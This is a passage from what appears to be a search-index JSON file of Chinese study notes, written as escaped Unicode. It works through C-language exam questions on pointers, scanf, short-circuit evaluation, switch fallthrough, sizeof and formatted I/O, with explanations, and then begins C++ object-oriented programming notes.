\u9898\u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a\u91ce\u6307\u9488\uff0c\u5373\u6ca1\u6709\u88ab\u8d4b\u503c\uff0c\u4e0d\u77e5\u9053\u6307\u5411\u4ec0\u4e48\u7684\u6307\u9488\u3002\u8fd9\u6837\u7684\u6307\u9488\u4e0d\u80fd\u8fdb\u884c\u89e3\u5f15\u7528\uff08\u4f1a\u62a5\u9519\uff09\uff0c\u56e0\u4e3a\u5b83\u968f\u673a\u6307\u5411\u7684\u4f4d\u7f6e\u5927\u6982\u7387\u662f\u4f60\u4e0d\u53ef\u7528\u7684\u7a7a\u95f4\u3002</p> <p>\u8981\u6e05\u695a\u7684\u662f\uff0c\u58f0\u660e\u4e00\u4e2a\u6307\u9488\u53ea\u4f1a\u5206\u914d\u4e00\u4e2a\u7ed9\u6307\u9488\u53d8\u91cf\u7684\u7a7a\u95f4\uff08\u8fd9\u90e8\u5206\u7a7a\u95f4\u7528\u6765\u5b58\u50a8\u5b83\u6307\u5411\u7684\u4f4d\u7f6e\u7684\u5730\u5740\u503c\uff09\uff0c\u800c\u4e0d\u4f1a\u5206\u914d\u6307\u5411\u7684\u7a7a\u95f4\u3002\u4f7f\u4e00\u4e2a\u6307\u9488\u53ef\u7528\u53ef\u4ee5\u5c06\u5176\u5b83\u53d8\u91cf\u53d6\u5730\u5740\u8d4b\u503c\u7ed9\u5b83\uff0c\u8fd9\u6837\u5b83\u6307\u5411\u7684\u4f4d\u7f6e\u5c31\u662f\u6709\u6548\u7684\u3002\u6216\u8005\u901a\u8fc7 malloc \u6765\u65b0\u5206\u914d\u4e00\u5757\u5806\u4e0a\u7684\u5185\u5b58\uff0cmalloc \u7684\u8fd4\u56de\u503c\u5c31\u662f\u8fd9\u5757\u5185\u5b58\u7684\u9996\u5730\u5740\uff0c\u4e5f\u662f\u4f60\u53ef\u7528\u7684\u3002</p> <ol> <li> <p>(C13A) In the following code fragments, item _ is correct.      A. int *p; scanf(\"%d\", &amp;p); B. int *p; scanf(\"%d\", p); C. int k, *p=&amp;k; scanf(\"%d\", p); D. int k, *p; *p=&amp;k; scanf(\"%d\", p); </p> <p>Success</p> <p>A. \u8fd9\u91cc\u5b9e\u9645\u4e0a\u662f\u8bfb\u5165\u4e86\u6570\u636e\u5199\u5230\u4e86 p \u6307\u9488\u7684\u7a7a\u95f4\u4e0a\uff08\u5373\u901a\u8fc7\u8f93\u5165\u6765\u7ed9\u6307\u9488\u8d4b\u503c\uff09\uff0c\u662f\u9519\u8bef\u7684\u64cd\u4f5c\uff1b B. \u8fd9\u91cc\u8bfb\u5165\u6570\u636e\u5199\u5230\u4e86 p \u6307\u5411\u7684\u7a7a\u95f4\u4e2d\uff0c\u800c p \u662f\u4e00\u4e2a\u91ce\u6307\u9488\uff0c\u4e0d\u80fd\u5411\u5b83\u6307\u5411\u7684\u7a7a\u95f4\u5199\u5165\u6570\u636e\uff0c\u662f\u9519\u8bef\u7684\uff1b C. \u8fd9\u91cc\u5c06 k \u7684\u5730\u5740\u8d4b\u503c\u7ed9\u4e86 p\uff0c\u6240\u4ee5\u8bfb\u5165\u4f1a\u5199\u5230 k \u4e2d\uff0c\u662f\u6b63\u786e\u7684\uff0c\u9009 C\uff1b D. \u8fd9\u91cc *p=&amp;k \u4e00\u53e5\u5b9e\u9645\u4e0a\u662f\u5c06 k \u7684\u5730\u5740\u5199\u5165 p \u6307\u5411\u7684\u7a7a\u95f4\u4e2d\uff0c\u540c\u7406\uff0cp \u662f\u91ce\u6307\u9488\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u662f\u9519\u8bef\u7684\u3002  </p> <p>Note</p> <p>\u8fd9\u91cc\u591a\u8bf4\u4e00\u5634 scanf \u7684\u4f5c\u7528\uff0cscanf \u8981\u8bfb\u53d6\u6570\u636e\u5199\u5230\u5185\u5b58\u4e2d\uff0c\u6240\u4ee5\u53c2\u6570\u4e3a\u6307\u9488\u3002 \u4f8b\u5982 int n; scanf(\"%d\", &amp;n); \"%d\" \u544a\u8bc9 scanf \u6211\u8981\u8bfb\u53d6\u4e00\u4e2a\u6574\u578b \u8bfb\u5230\u54ea\u91cc\u2014\u2014\u2014\u2014\u8bfb\u5230\u53d8\u91cf n \u7684\u5185\u5b58\u7a7a\u95f4\u4e2d n \u5b58\u5728\u54ea\u91cc\u2014\u2014\u2014\u2014n \u7684\u5730\u5740 \u600e\u4e48\u5f97\u5230 n \u7684\u5730\u5740\u2014\u2014\u2014\u2014\u901a\u8fc7 &amp; \u53d6\u5730\u5740  </p> </li> <li> <p>\u5047\u8bbe <code>scanf</code> \u8bed\u53e5\u6267\u884c\u65f6\u8f93\u5165 <code>ABCDE&lt;\u56de\u8f66&gt;</code>\uff0c\u80fd\u4f7f <code>puts(s)</code> \u8bed\u53e5\u6b63\u786e\u8f93\u51fa <code>ABCDE</code> \u7684\u7a0b\u5e8f\u6bb5\u662f _____.     A. char s[5] = {\"ABCDE\"}; puts(s);     B. char s[5] = {'A', 'B', 'C', 'D', 'E'}; puts(s);     C. char *s; scanf(\"%s\", s); puts(s);     D. char *s; s=\"ABCDE\"; puts(s);</p> <p>Success</p> <p>A. s \u7684\u5927\u5c0f\u53ea\u6709 5 \u4e2a\u5b57\u8282\uff0c\u653e\u4e0d\u4e0b\u6700\u540e\u7684 '\\0'\uff0c\u6240\u4ee5 puts \u53ef\u80fd\u51fa\u9519 B. \u7ed3\u5c3e\u6ca1\u6709 '\\0'\uff0cputs \u53ef\u80fd\u51fa\u9519 C. \u5411\u91ce\u6307\u9488 s \u5199\u5165\u4e86\u6570\u636e\uff0c\u4e00\u5b9a\u51fa\u9519 D. \u5c06\u9759\u6001\u5b58\u50a8\u533a\u4e2d \"ABCDE\" \u7684\u9996\u5730\u5740\u7ed9\u4e86 s\uff0c\u7136\u540e\u8f93\u51fa\uff0c\u5b8c\u5168\u6b63\u786e\uff0c\u9009 D</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_13","title":"\"\u5947\u602a\"\u7684\u8868\u8fbe\u5f0f/\u8bed\u53e5","text":"<p>\u4e00\u4e9b\u5b8c\u5168\u8bed\u6cd5\u6b63\u786e\uff0c\u4f46\u662f\u53ef\u80fd\u4f1a\u6df7\u6dc6\u89c6\u542c\u8ba9\u4f60\u7406\u89e3\u9519\u8bef\u7684\u8868\u8fbe\u5f0f/\u8bed\u53e5\u3002</p> <ol> <li> <p>(C13A) Given: <code>char c='@'</code>;, the value of expression <code>'A' &lt;= c &lt;= 'Z'</code> is _____.</p> <p>Success</p> <p>\u4e00\u4e2a\u7ecf\u5178\u95ee\u9898\uff0c'A' &lt;= c &lt;= 'Z' \u5e76\u4e0d\u662f\u5224\u65ad c \u5728\u4e0d\u5728 A-Z \u8303\u56f4\u5185\uff0c\u800c\u662f\u7b49\u4ef7\u4e8e ('A' &lt;= c) &lt;= 'Z'\u3002\u5176\u4e2d 'A' &lt;= c \u4e00\u5b9a\u662f 0 \u6216 1\uff0c\u65e0\u8bba\u5982\u4f55\u90fd\u5c0f\u4e8e 'Z'\uff0c\u6240\u4ee5\u7ed3\u679c\u4e3a 1\u3002</p> </li> <li> <p>(C13A) After executing the code below, the value of y is _____.     <pre><code>int x = 0, y = 0, z = 0;\nz = (x==1) &amp;&amp; (y=2);\n</code></pre></p> <p>Success</p> <p>\u8fd9\u91cc\u6d89\u53ca\u5230\u4e86 || \u548c &amp;&amp; \u7684\u201c\u77ed\u8def\u201d\u6027\u8d28\uff1a\u5f53 &amp;&amp; \u5de6\u8fb9\u4e3a\u5047\u65f6\uff0c\u6574\u4f53\u4ee5\u5b9a\u4f4d\u5047\uff0c\u5219\u53f3\u8fb9\u4e0d\u518d\u8ba1\u7b97\uff1b\u5f53 || \u5de6\u8fb9\u4e3a\u771f\u65f6\uff0c\u6574\u4f53\u4e00\u5b9a\u4e3a\u771f\uff0c\u5219\u53f3\u8fb9\u4e0d\u518d\u8ba1\u7b97\u3002</p> <p>\u8fd9\u91cc x==1 \u5df2\u7ecf\u4e3a\u5047\uff0c\u6240\u4ee5\u53f3\u4fa7\u7684 y=2 \u4e0d\u518d\u6267\u884c\uff0cy \u4ecd\u7136\u4e3a 0\u3002 </p> </li> <li> <p>(C17A) After executing the following code fragment, the output is _____.     <pre><code>int i, b; i = b = 1;\nswitch (i) {\n    case 0: b += 1;\n    case 1: b += 2;\n    case 3: switch (b) {\n        case 3: i++;\n        default: break;\n    }\n    i += 1;\n}\nprintf(\"%d#%d#\", i, b);\n</code></pre></p> <p>Success</p> <p>case \u53ea\u89c4\u5b9a\u4e86\u8d77\u70b9\uff0c\u800c\u4f55\u65f6\u9000\u51fa switch \u5757\u5219\u7531 break \u51b3\u5b9a\uff0c\u53ea\u8981\u6ca1\u6709\u9047\u5230 break\uff0c\u5219\u4e00\u76f4\u5411\u4e0b\u6267\u884c\uff08\u5373\u4f7f\u78b0\u5230\u4e86\u4e0b\u4e00\u4e2a case\uff09</p> <p>\u8fd9\u9898\u91cc i \u4e3a 1\uff0c\u8fdb\u5165\u4e86 case 1 \u4e2d\uff0cb \u53d8\u4e3a\u4e86 3\uff0c\u7d27\u63a5\u7740\u56e0\u4e3a\u6ca1\u6709 break \u8fd8\u4f1a\u8fdb\u5165\u5230 case 3 \u4e2d\uff0c\u6b64\u65f6 b \u4e3a 3 \u8fdb\u5165\u4e86 case 3 \u6267\u884c\u4e86 i++\uff0c\u7136\u540e\u8fdb\u5165 default \u6267\u884c\u4e86 break\uff0c\u9000\u51fa\u540e\u53c8\u6267\u884c\u4e86 i+=1\uff0c\u6240\u4ee5\u6700\u7ec8 i \u548c b \u90fd\u4e3a 3\u3002</p> </li> <li> <p>\u4e0b\u5217\u4ee3\u7801\u6267\u884c\u540e m \u548c n \u7684\u503c\u5206\u522b\u4e3a _____.     <pre><code>int a=1, b=2, c=3, d=4, m=1, n=2, v;\nv = (m=a&gt;b) &amp;&amp; (n=c&gt;d);\n</code></pre></p> <p>Success</p> <p>\u540c 35 \u9898\uff0c(m=a&gt;b) \u5df2\u7ecf\u4e3a\u5047\uff08\u5c06 a&gt;b \u5373 0 \u8d4b\u503c\u7ed9 m\uff0c\u7136\u540e\u5224\u65ad m \u662f\u5426\u4e3a 0\uff0c\u662f 0\uff0c\u90a3\u4e48\u6574\u4f53\u5c31\u662f\u5047\uff09\uff0c\u53f3\u4fa7\u7684 (n=c&gt;d) \u4e0d\u518d\u6267\u884c\uff0c\u6240\u4ee5\u6700\u7ec8 m=0, n=2\u3002</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u8bed\u6cd5\u6b63\u786e\u7684\u662f _____.     A. for ( );     B. do { } while ( );     C. while ( ) ;     D. for ( ; ; ) ;</p> <p>Success</p> <p>while \u540e\u7684\u62ec\u53f7\u4e2d\u5fc5\u987b\u6709\u6761\u4ef6\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5 BC \u9519\u8bef\uff1bfor \u540e\u9762\u7684\u62ec\u53f7\u4e2d\u5fc5\u987b\u6709\u4e24\u4e2a\u5206\u53f7\u5206\u5272\u7684\u4e09\u4e2a\u8bed\u53e5\uff0c\u6240\u4ee5 A \u9519\u8bef\u3002 D \u662f\u6b63\u786e\u7684\uff0cfor( ; ; ) \u5c31\u8868\u793a\u6b7b\u5faa\u73af\uff0c\u800c\u540e\u9762\u7684 ; \u8868\u793a\u5faa\u73af\u4f53\u4e3a\u7a7a\uff0c\u8bed\u6cd5\u5b8c\u5168\u6b63\u786e\uff0c\u662f\u4e00\u4e2a\u5f7b\u5e95\u7684\u6b7b\u5faa\u73af\u3002</p> </li> <li> <p>\u6709\u5b9a\u4e49 <code>int a = 1;</code>\uff0c\u5219\u8868\u8fbe\u5f0f <code>(a=4*5,a*2),a+6</code> \u7684\u503c\u4e3a _____.</p> <p>Success</p> <p>\u8fd9\u91cc\u7684\u8003\u70b9\u662f\u300c\u9017\u53f7\u8868\u8fbe\u5f0f\u300d\uff0c\u9017\u53f7\u8868\u8fbe\u5f0f\u5728\u6267\u884c\u65f6\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u6267\u884c\u9017\u53f7\u5206\u5272\u7684\u5404\u4e2a\u90e8\u5206\uff0c\u7136\u540e\u8868\u8fbe\u5f0f\u6700\u7ec8\u7684\u503c\u4e3a\u6700\u53f3\u4fa7\u7684\u503c\u3002 \u8fd9\u91cc\u5148\u6267\u884c\u4e86 a=4*5\uff0c\u7136\u540e\u6267\u884c\u4e86 a*2\uff08\u6ca1\u6709\u4efb\u4f55\u6548\u679c\uff09\uff0c\u6700\u7ec8\u7684\u503c\u4e3a a+6 = 20+6 = 26\u3002</p> </li> <li> <p>\u5b9a\u4e49 <code>int a[][3] = {{1, 2, 3}, (4, 5, 6)}</code> \u662f\u5426\u6b63\u786e _\uff0c\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48 <code>a[1][0]</code> \u7684\u503c\u4e3a ___.</p> <p>Success</p> <p>\u8fd9\u91cc\u4e5f\u662f\u4e00\u4e2a\u9017\u53f7\u8868\u8fbe\u5f0f\u7684\u5e94\u7528\uff0c\u4e0d\u8fc7 (4, 5, 6) \u51fa\u73b0\u5728\u8fd9\u91cc\u5f88\u5bb9\u6613\u6df7\u6dc6\u8ba9\u4eba\u4ee5\u4e3a\u662f\u4e00\u4e2a\u6570\u7ec4\u3002\u5176\u5b9e\u8fd9\u9053\u9898\u7684\u5b9a\u4e49\u76f8\u5f53\u4e8e <code>int a[][3] = {{1, 2, 3}, 6}</code>\uff0c\u6240\u4ee5 a[1][0] \u503c\u4e3a 6\u3002</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#sizeof","title":"sizeof \u95ee\u9898","text":"<p>sizeof \u662f C \u8bed\u8a00\u4e2d\u7684\u4e00\u4e2a\u8fd0\u7b97\u7b26\uff0c\u800c\u4e0d\u662f\u51fd\u6570\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u67e5\u8be2\u5360\u636e\u7684\u7a7a\u95f4\u5b57\u8282\u6570\u3002\u4f8b\u5982 sizeof(int) \u8ba1\u7b97\u4e00\u4e2a int \u5360\u7684\u5b57\u8282\u6570\uff0c\u4e5f\u5c31\u662f 4\uff1bint a[2]; sizeof(a) \u8ba1\u7b97 a \u8fd9\u4e2a\u6570\u7ec4\u5360\u7684\u5b57\u8282\u6570\uff0c\u4e5f\u5c31\u662f 2 \u4e2a int\uff0c\u5373 2*4=8\u3002</p> <ol> <li> <p>(C18A) Given: <code>short s[][5]={301,302,303,304,305,306,307,308,309,0};</code>, the values of <code>sizeof(s)</code> and <code>strlen((char *)s)</code> will be _____ respectively.</p> <p>Success</p> <p>\u4e00\u4e2a short \u5360\u4e24\u4e2a\u5b57\u8282\uff0c301 \u7684\u5b58\u50a8\u65b9\u5f0f\u662f\u5b58\u50a8 0x2d 0x01 \u4e24\u4e2a\u5b57\u8282\uff08\u5c0f\u7aef\u5e8f\uff09\uff0c\u6240\u4ee5 s \u6570\u7ec4\u5728\u5185\u5b58\u4e2d\u4e3a\uff1a <pre><code>2d 01 2e 01 2f 01 30 01 31 01 32 01 33 01 34 01 35 01 00 00 \n</code></pre> \u4e00\u5171 20 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5 sizeof(s) = 20\uff0c\u800c strlen((char *)s) = 18\uff08\u7b2c\u4e00\u4e2a 00 \u524d\u7684\u5b57\u8282\u6570\uff09</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u7684\u8f93\u51fa\u4e3a _____.     <pre><code>char c[100] = \"1234\";\nprintf(\"%d#%d#\", sizeof(c), strlen(c));\n</code></pre></p> <p>Success</p> <p>sizeof(c) = 100\uff0cstrlen(c) = 4\uff0c\u4e0d\u591a\u89e3\u91ca</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u7684\u8f93\u51fa\u4e3a _____.     <pre><code>void func(int a[5]) {\n    printf(\"%d\", sizeof(a));\n}\nint main() {\n    int a[5] = {0};\n    printf(\"%d\\n\", sizeof(a));\n    func(a);\n}\n</code></pre></p> <p>Success</p> <p>\u8fd9\u91cc\u9996\u5148\u8f93\u51fa\u6570\u7ec4 a \u5360\u7684\u5b57\u8282\u6570\uff0c\u4e5f\u5c31\u662f 4*5=20\u3002\u7136\u540e\u5c06 a \u4f20\u5165 func \u51fd\u6570\u540e\uff0ca \u9000\u5316\u4e3a\u4e86\u6307\u9488\uff08\u5373\u4f7f\u51fd\u6570\u524d\u9762\u91cc\u7c7b\u578b\u8fd8\u662f int[5]\uff09\uff0c\u5728 func \u51fd\u6570\u4e2d\u8ba1\u7b97 sizeof(a) \u7684\u8bdd\u8f93\u51fa\u7684\u5c31\u662f\u6307\u9488\u5360\u7684\u5927\u5c0f\uff0c\u8fd9\u4e2a\u503c\u662f\u4e0d\u4e00\u5b9a\u7684\uff0c\u5728 32 \u4f4d\u67b6\u6784\u4e2d\u662f 4\uff0c\u5728 64 \u4f4d\u67b6\u6784\u4e2d\u662f 8\u3002</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_14","title":"\u5173\u4e8e\u8f93\u5165\u8f93\u51fa","text":"<p>\u683c\u5f0f\u5316\u8f93\u5165\u8f93\u51fa\uff08printf\uff0cscanf\uff09\u8fd8\u6709\u4e24\u79cd\u53d8\u4f53\uff1asprintf\uff0csscanf \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5b57\u7b26\u4e32\uff08char\uff09\uff0c\u4f1a\u8f93\u51fa\u5230\u5b57\u7b26\u4e32\u4e2d/\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u8f93\u5165\uff1bfprintf\uff0cfscanf \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u6587\u4ef6\u6307\u9488\uff08FILE\uff09\uff0c\u4f1a\u8f93\u51fa\u5230\u6587\u4ef6\u4e2d/\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u8f93\u5165\u3002\u800c printf scanf \u5219\u662f\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa/\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u8f93\u5165\u3002stdin stdout \u662f\u4e24\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u6240\u4ee5 printf scanf \u5206\u522b\u7b49\u4ef7\u4e8e fprintf(stdout, ...) \u548c fscanf(stdin, ...)\u3002</p> <p>\u5173\u4e8e scanf \u7684\u8fd4\u56de\u503c\uff0c\u5b83\u8fd4\u56de\u6b63\u5e38\u8bfb\u53d6\u7684\u53d8\u91cf\u4e2a\u6570\uff0c\u5982\u679c\u9047\u5230\u4e86\u6587\u4ef6\u7ed3\u5c3e\uff0c\u5219\u8fd4\u56de EOF \u5373 -1\u3002</p> <ol> <li> <p>(C16A) For the code below:     <pre><code>int a, b; char c;\nscanf(\"%d%c%d\",&amp;a,&amp;c,&amp;b);\n</code></pre>     If let <code>a=1,b=2,c='+'</code>, the input _____ is NOT correct.     A. 1+2&lt;ENTER&gt;     B. &lt;BLANK&gt;&lt;ENTER&gt;1+&lt;ENTER&gt;2&lt;ENTER&gt;     C. &lt;ENTER&gt;1&lt;ENTER&gt;+&lt;BLANK&gt;2&lt;ENTER&gt;     D. &lt;BLANK&gt;&lt;BLANK&gt;1+&lt;BLANK&gt;&lt;BLANK&gt;2&lt;ENTER&gt; </p> <p>Success</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f %d \u4f1a\u5ffd\u7565\u6570\u5b57\u5de6\u8fb9\u7684\u7a7a\u767d\u5b57\u7b26\uff08\u5305\u62ec\u7a7a\u683c\u3001\u6362\u884c\u7b49\uff09\uff0c\u800c %c \u4f1a\u7acb\u5373\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u3002 A. \u5b8c\u5168\u6b63\u786e\uff0c\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684 B. 1 \u524d\u9762\u7684\u7a7a\u767d\u548c\u6362\u884c\u5ffd\u7565\u4e86\uff0c%c \u8bfb\u4e86 '+'\uff0c\u63a5\u4e0b\u6765 %d \u5ffd\u7565\u4e86\u6362\u884c\u8bfb\u4e86 2 C. 1 \u524d\u9762\u6362\u884c\u5ffd\u7565\u4e86\uff0c\u63a5\u4e0b\u6765 %c \u7acb\u5373\u8bfb\u5230\u4e86\u4e00\u4e2a '\\n'\uff0c\u7136\u540e\u51fa\u73b0\u4e86 '+' \u5bfc\u81f4\u540e\u9762 %d \u8bfb\u53d6\u5931\u8d25\uff08\u5982\u679c\u8fd9\u65f6\u68c0\u67e5 scanf \u7684\u8fd4\u56de\u503c\uff0c\u5e94\u8be5\u662f 2 \u800c\u4e0d\u662f 3\uff09 D. \u4e0e B \u540c\u7406\u662f\u6b63\u786e\u7684</p> </li> <li> <p>(C18A) The statement <code>printf(\"%%d%d\", 012);</code> will print out _____.</p> <p>Success</p> <p>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\uff0c%% \u8868\u793a\u8f93\u51fa\u4e00\u4e2a %\uff0c\u63a5\u4e0b\u6765 d \u5b57\u7b26\u539f\u6837\u8f93\u51fa\uff0c\u7136\u540e %d \u8f93\u51fa 012\uff08\u516b\u8fdb\u5236\uff0c\u8f6c\u4e3a\u5341\u8fdb\u5236\u4e3a 10\uff09\uff0c\u6240\u4ee5\u8f93\u51fa\u4e3a %d10</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u7684\u8f93\u51fa\u4e3a _____.     <pre><code>int x = -1;\nprintf(\"%d\", (unsigned int)x);\n</code></pre></p> <p>Success</p> <p>unsigned int \u7684\u8f6c\u6362\u5e76\u4e0d\u4f1a\u6539\u53d8 x \u7684\u4e8c\u8fdb\u5236\u503c\uff08\u800c\u662f\u4ee5\u65e0\u7b26\u53f7\u7684\u65b9\u5f0f\u6765\u7406\u89e3\u8fd9\u6bb5\u6570\u636e\uff09\uff0c\u800c\u5bf9\u4e8e printf \u6765\u8bf4\uff0c\u5b83\u8981\u8f93\u51fa\u7684\u662f\u4e00\u4e2a %d\uff0c\u5373\u6709\u7b26\u53f7\u6570\uff08\u65e0\u7b26\u53f7\u7528 %u\uff09\uff0c\u6240\u4ee5\u8f93\u51fa\u65f6\u8fd8\u662f\u4f1a\u5f53\u4f5c\u6709\u7b26\u53f7\u6574\u578b\u6765\u7406\u89e3\uff0c\u5373\u8f93\u51fa -1\u3002</p> </li> <li> <p>\u4ee5\u4e0b\u4ee3\u7801\u7684\u8f93\u51fa\u4e3a _____.     <pre><code>char str[100] = \"ZhejiangU 1 3 5\", s[10];\nint n;\nsscanf(str, \"%s %*d %d %*d\", s, &amp;n);\nprintf(\"%s\", &amp;s[n]);\n</code></pre></p> <p>Success</p> <p>%*d \u8868\u793a\u8bfb\u53d6\u4e00\u4e2a\u6574\u578b\uff0c\u4f46\u662f\u76f4\u63a5\u5ffd\u7565\uff0c\u4e0d\u5b58\u5230\u53d8\u91cf\u4e2d\u3002 \u6240\u4ee5 sscanf \u8bfb\u53d6\u5230\u7684 n \u662f\u7b2c\u4e8c\u4e2a\u6570\u5b57\u4e5f\u5c31\u662f 3\uff0c\u7136\u540e\u8f93\u51fa s[3] \u5f00\u59cb\u7684\u5b57\u7b26\u4e32\uff0c\u5373 jiangU\u3002</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_15","title":"\u4e00\u4e9b\u602a\u9898","text":"<p>\u4e00\u4e9b\u6ca1\u4ec0\u4e48\u610f\u4e49\u7684\u602a\u9898\uff0c\u4e0d\u8981\u6df1\u7a76\uff0c\u9009\u62e9\u4e00\u4e2a\u6700\u6b63\u786e\u3001\u6ca1\u6709\u4e89\u8bae\u7684\u5c31\u53ef\u4ee5\u4e86\u3002</p> <ol> <li> <p>(C15A) In the following expressions, _____ is meanless(\u65e0\u610f\u4e49)      A. \"hello,world\"-\"hello\" B. 'w'-'h' C. \"hello\"+10/4 D. 'a'+3/2 </p> <p>Success</p> <p>A \u5b57\u7b26\u4e32\u5e38\u91cf\u76f8\u51cf\u76f8\u5f53\u4e8e\u4e24\u4e2a\u5b57\u7b26\u4e32\u9996\u5730\u5740\u76f8\u51cf\uff0c\u6ca1\u6709\u610f\u4e49 BCD \u90fd\u80fd\u8bf4\u51fa\u70b9\u610f\u4e49\u6765\uff0c\u6240\u4ee5\u6700\u4f18\u9009 A\u3002</p> </li> <li> <p>(C18A) Which of the following expressions is meaningful(\u6709\u610f\u4e49\u7684)? _____      A. \"hello\"*2 B. 'w'*'h' C. \"hello\"[1] D. \"hello\"-'h' </p> <p>Success</p> <p>\u540c\u6837\uff0cA \u5b57\u7b26\u4e32\u9996\u5730\u5740\u4e58\u4ee5 2 \u6ca1\u6709\u610f\u4e49\uff0cB \u4e24\u4e2a\u5b57\u7b26\u4e32 ASCII \u7801\u76f8\u4e58\u4e5f\u6ca1\u5565\u5927\u610f\u4e49\u3002D \u5b57\u7b26\u4e32\u9996\u5730\u5740\u51cf 'h' \u4e5f\u5c31\u662f 104\uff0c\u4e5f\u6ca1\u5565\u610f\u4e49\u3002 C \"hello\"[1] \u8868\u793a *(\"hello\"+1) \u5373 'e'\uff0c\u8fd8\u7b97\u6709\u70b9\u610f\u4e49\uff0c\u6700\u4f18\u9009 C</p> </li> <li> <p>(C17A) Which of the following is correct\uff1f _____.     <pre><code>int main() {\n    int n[10];\n    ...\n    fun(n);\n    ...\n}\nint fun(int a[]) {\n    ...\n}\n</code></pre>     A. Within the function fun, a is an initial address of an array, whose value cannot be changed.     B. Within the function main, the reference such as &amp;n is invalid.     C. Because of call-by-value, the elements of the array n cannot be changed within the fun.     D. Within the function fun, the reference such as &amp;a is invalid. </p> <p>Success</p> <p>AC \u80af\u5b9a\u662f\u9519\u7684\uff0cA. fun \u51fd\u6570\u91cc a \u662f\u4e00\u4e2a\u5c40\u90e8\u6307\u9488\u53d8\u91cf\uff08\u6570\u7ec4\u9000\u5316\u4e86\uff09\uff0c\u5b83\u7684\u503c\u53ef\u4ee5\u6539\u53d8\uff1bC. main \u51fd\u6570\u628a n \u7684\u5730\u5740\u4f20\u7ed9\u4e86 fun \u51fd\u6570\u4f5c\u4e3a a \u7684\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7 a \u6307\u9488\u6765\u8bbf\u95ee n \u6570\u7ec4\u5904\u7684\u5185\u5b58\uff0c\u53ef\u4ee5\u6539\u53d8 n \u6570\u7ec4\u7684\u5143\u7d20\u3002</p> <p>BD \u5c31\u6bd4\u8f83\u602a\u4e86\uff0c\u6211\u7684\u7406\u89e3\u65b9\u5f0f\u662f \"Within the function\" \u4ee3\u8868\u4e86\u51fd\u6570\u7ea7\u4f5c\u7528\u57df\uff0c\u800c main \u51fd\u6570\u91cc n \u7684\u4f5c\u7528\u57df\u4e0d\u662f\u201c\u51fd\u6570\u7ea7\u201d\u7684\uff0c\u800c\u662f\u5728 int n[10]; \u4e00\u53e5\u4ee5\u4e0b\uff0cmain \u51fd\u6570\u5927\u62ec\u53f7\u4e4b\u4e0a\u3002\u800c fun \u4e2d a \u5728\u6574\u4e2a\u51fd\u6570\u5185\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002\u8fd9\u662f\u4e8c\u8005\u7684\u6700\u5927\u533a\u522b\uff0c\u786c\u8981\u9009\u4e00\u4e2a\u80af\u5b9a\u9009 B\u3002</p> </li> </ol>"},{"location":"cs/pl/c_cpp/oop/","title":"C++ \u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1","text":"<p> \u7ea6 3208 \u4e2a\u5b57  133 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0\uff0c\u8bed\u8a00\u662f C++\u3002\u8fd9\u91cc\u5c31\u7b80\u5355\u8bb0\u70b9\u6211\u89c9\u5f97\u989d\u5916\u9700\u8981\u6ce8\u610f\u7684\u5185\u5bb9\uff0c\u4e0d\u4f1a\u5f88\u5168\u9762\uff0c\u5f88\u591a\u540c\u5b66/\u5b66\u957f\u5df2\u7ecf\u505a\u4e86\u5f88\u4e30\u5bcc\u7684\u7b14\u8bb0\uff0c\u6211\u5217\u5728\u4e0b\u9762\u4e86\uff0c\u4e5f\u5c31\u4e0d\u91cd\u590d\u52b3\u52a8\u4e86\u3002</p> <p>\u53c2\u8003</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1</li> </ul> <p>\u66f4\u591a\u66f4\u597d\u7684\u53c2\u8003\u7b14\u8bb0</p> <ul> <li>xyx \u7684\u4f17\u591a C++ \u7b14\u8bb0</li> <li>HobbitQia \u7684 oop \u7b14\u8bb0</li> <li>\u4fee\u4f6c\u7684 oop \u7b14\u8bb0\uff08\u8bed\u96c0\uff09</li> <li>fcrgg \u7684 oop \u7b14\u8bb0\uff08pdf\uff09</li> <li>\u8d3a\u8001\u5e08\u7684 C/C++ \u6c89\u601d\u5f55\uff08\u77e5\u4e4e\u4e13\u680f\uff09</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_1","title":"\u5173\u4e8e\u53d8\u91cf","text":""},{"location":"cs/pl/c_cpp/oop/#_2","title":"\u5f15\u7528","text":"<ul> <li>\u5f15\u7528\u672c\u8d28\u4e0a\u662f\u6307\u9488</li> <li><code>typename &amp;ref = var;</code> \u521b\u5efa binding 